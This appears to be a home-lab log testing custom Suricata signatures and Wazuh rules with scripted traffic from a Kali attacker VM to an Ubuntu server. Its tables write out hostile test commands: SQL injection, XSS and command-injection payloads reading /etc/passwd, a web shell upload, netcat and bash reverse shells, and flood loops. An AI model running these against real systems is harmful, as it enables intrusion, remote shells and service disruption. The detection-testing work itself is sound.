# Detection Testing Log

All 20 custom Suricata signatures were validated with controlled traffic generated from Kali-Attacker toward Ubuntu-SOC-Server. Results were checked in `/var/log/suricata/fast.log`, structured events were inspected in `eve.json`, and Wazuh rules were cross-checked in the Dashboard and with Wazuh Logtest.

> **Safety:** The tests are intended for the isolated lab only. The EICAR test is a harmless antivirus test string, not real malware.

## Reconnaissance

| Rule | Test | Result |
|---|---|---|
| Nikto Scanner Detected | `nikto -h http://10.0.2.3 -useragent "Nikto-Scanner-Test"` | ✅ Fired. Default modern Nikto User-Agent behavior can evade this signature; see limitations. |
| Gobuster Scan Detected | `gobuster dir -u http://10.0.2.3 -w /usr/share/wordlists/dirb/common.txt` | ✅ Fired. Duplicate-alert volume was reduced with a source-based threshold. |
| Curl Usage Detected | `curl http://10.0.2.3` | ✅ Fired. |
| Wget Usage Detected | `wget http://10.0.2.3` | ✅ Fired. |

## Web Attacks

| Rule | Test | Result |
|---|---|---|
| SQL Injection | `curl "http://10.0.2.3/?id=1%20UNION%20SELECT%20username,password%20FROM%20users"` | ✅ Fired. URL-encoded spaces are required by curl. |
| XSS Script Tag | `curl "http://10.0.2.3/?comment=<script>alert(1)</script>"` | ✅ Fired. |
| XSS Event Handler | `curl "http://10.0.2.3/?name=testonerror=alert(1)"` | ✅ Fired. |

## Command Injection

| Rule | Test | Result |
|---|---|---|
| Semicolon | `curl "http://10.0.2.3/?file=test;cat%20/etc/passwd"` | ❌ → ✅. Fixed by matching Suricata's decoded `;` representation and escaping the rule syntax. |
| AND Operator | `curl "http://10.0.2.3/?file=test&&whoami"` | ❌ → ✅. Fixed by matching decoded `&&` rather than `%26%26`. |
| Pipe | `curl "http://10.0.2.3/?file=test|id"` | ❌ → ✅. Final rule uses hex notation `|7C|`. |

## Web Shell / Upload

| Rule | Test | Result |
|---|---|---|
| PHP System Call | `curl "http://10.0.2.3/?cmd=system(whoami)"` | ✅ Fired. |
| PHP Web Shell Upload | `curl -X POST --data-binary @shell.php "http://10.0.2.3/upload.php"` | ✅ Fired. The target server does not execute the uploaded file. |
| Netcat Reverse Shell Upload | `curl -X POST --data "payload=nc -e /bin/sh 10.0.2.15 4444" "http://10.0.2.3/upload"` | ✅ Fired. |

## Reverse Shell

| Rule | Test | Result |
|---|---|---|
| Bash TCP Reverse Shell | `bash -i >& /dev/tcp/10.0.2.15/4444 0>&1` | ❌ → ✅. `/dev/tcp/` is Bash-internal and does not cross the network; detection was changed to shell output such as `uid=`. |
| Netcat Reverse Shell | Controlled shell output | ⚠️ Initial false positives against Wazuh traffic were reduced by excluding port 1514 in the specific signature. |

## Denial of Service

| Rule | Test | Result |
|---|---|---|
| HTTP Flood | `for i in {1..60}; do curl -s http://10.0.2.3 > /dev/null; done` | ✅ Fired. |
| SYN Flood | `sudo nmap -sS --min-rate 500 -p 1-200 10.0.2.3` | ✅ Fired. |

These are lab-scale detection tests, not performance or availability benchmarks.

## Malware Test

| Rule | Test | Result |
|---|---|---|
| EICAR Test File | `curl -O http://10.0.2.3/eicar.txt` | ❌ → ✅. The rule was corrected to inspect HTTP downloads using `flow:to_client` and proper escaping. |

The EICAR string is a standard harmless antivirus test pattern. No real malware is used.

## DNS

| Rule | Test | Result |
|---|---|---|
| DNS Long Query | `dig @10.0.2.3 thisisaveryverylongdnsqueryusedtosimulatedatatunnelingoverdns.example.com` | ✅ Fired. The query was directed to Ubuntu so Suricata could observe it. |
| DNS High Entropy Query | `dig @10.0.2.3 a8f3k9x2m7q1w5e8r4t6y0u3i9o2p7asdf.example.com` | ✅ Fired. |

## Wazuh Rule Verification

Each Wazuh rule from `100001` through `100020` was validated with:

```bash
sudo /var/ossec/bin/wazuh-logtest
```

The test input matched the Suricata `eve.json` alert structure and was checked for:

- Correct rule ID
- Expected severity
- Detection description
- MITRE ATT&CK tag

The live event was then verified in the Wazuh Dashboard.

## Key Testing Lessons

The most valuable results were not only successful detections. Several failures exposed practical detection-engineering issues:

1. HTTP URI buffers may be decoded before rule matching.
2. Suricata rule syntax treats some characters specially.
3. Client-side shell strings are not necessarily visible on the wire.
4. High-volume scanners require thresholding to avoid alert floods.
5. Wazuh rules should target decoded Suricata fields when chained from rule `86601`.
6. Complex Suricata JSON event types can exceed Wazuh's decoder field limits.
